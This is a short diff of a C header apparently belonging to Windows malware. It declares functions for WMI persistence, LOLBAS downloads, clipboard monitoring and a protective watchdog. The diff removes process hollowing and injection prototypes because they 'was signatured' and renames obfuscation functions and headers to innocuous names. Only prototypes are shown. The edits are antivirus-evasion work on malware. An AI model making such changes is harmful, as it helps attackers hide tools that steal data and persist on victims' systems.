@@ -99,11 +99,11 @@ const char* sys_check_critical_status_with_name(void);
 int sys_is_admin(void);
 void sys_spawn_shadow_copy(void);
 void sys_wmi_persistence(void);
-void sys_hollow_process(void);
-void sys_inject_process(void);
+/* REMOVED: process hollowing was signatured */
+/* REMOVED: process injection was signatured */
 void sys_harden_files(void);
 void sys_lolbas_download(const char *url, const char *outPath);
-char* sys_obfuscate_ps(const char *command);
+char* sys_encode_cmd(const char *command);
 DWORD WINAPI sys_protect_watchdog(LPVOID lpParam);
 void sys_uninstall(void);
 
@@ -115,7 +115,7 @@ char* copy_buffer_read_now(void);
 char* copy_buffer_get_history(void);
 DWORD WINAPI copy_buffer_monitor_thread(LPVOID lpParam);
 void copy_buffer_debug_log(const char *fmt, ...);
-#include "../utils/obf.h"
+#include "../utils/util.h"
 
 /* === Security Audit === */
 char* config_scan_scan_system(void);
